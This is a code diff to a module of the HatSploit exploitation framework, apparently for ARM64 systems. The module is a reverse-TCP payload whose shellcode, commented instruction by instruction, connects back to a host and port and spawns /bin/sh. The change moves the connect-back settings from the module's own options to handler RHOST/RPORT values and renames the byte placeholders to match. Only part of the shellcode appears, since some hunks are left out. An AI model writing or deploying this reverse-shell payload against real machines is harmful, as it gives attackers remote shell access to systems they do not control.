@@ -6,7 +6,6 @@
 #
 
 from hatsploit.lib.payload import Payload
-from hatsploit.utils.tcp import TCPClient
 
 
 class HatSploitPayload(Payload):
@@ -24,23 +23,9 @@ class HatSploitPayload(Payload):
         'Type': "reverse_tcp"
     }
 
-    options = {
-        'CBHOST': {
-            'Description': "Connect-back host.",
-            'Value': TCPClient.get_local_host(),
-            'Type': "ip",
-            'Required': True
-        },
-        'CBPORT': {
-            'Description': "Connect-back port.",
-            'Value': 8888,
-            'Type': "port",
-            'Required': True
-        }
-    }
-
     def run(self):
-        connback_host, connback_port = self.parse_options(self.options)
+        remote_host = self.handler['RHOST']
+        remote_port = self.handler['RPORT']
 
         return (
             b"\x40\x00\x80\xd2"       # mov x0, #0x2
@@ -75,13 +60,13 @@ class HatSploitPayload(Payload):
             b"\x00\x00\x80\xd2"       # mov x0, #0x0
             b"\x30\x00\x80\xd2"       # mov x16, #0x1
             b"\x01\x00\x00\xd4"       # svc #0x0
-            b"\x02\x00:cbport:port:"  # port
-            b":cbhost:ip:"            # host
+            b"\x02\x00:rport:port:"  # port
+            b":rhost:ip:"            # host
             b"\x2f\x62\x69\x6e"
             b"\x2f\x73\x68\x00"
             b"\x00\x00\x00\x00"
             b"\x00\x00\x00\x00"
         ), {
-            'cbhost': connback_host,
-            'cbport': connback_port
+            'rhost': remote_host,
+            'rport': remote_port
         }
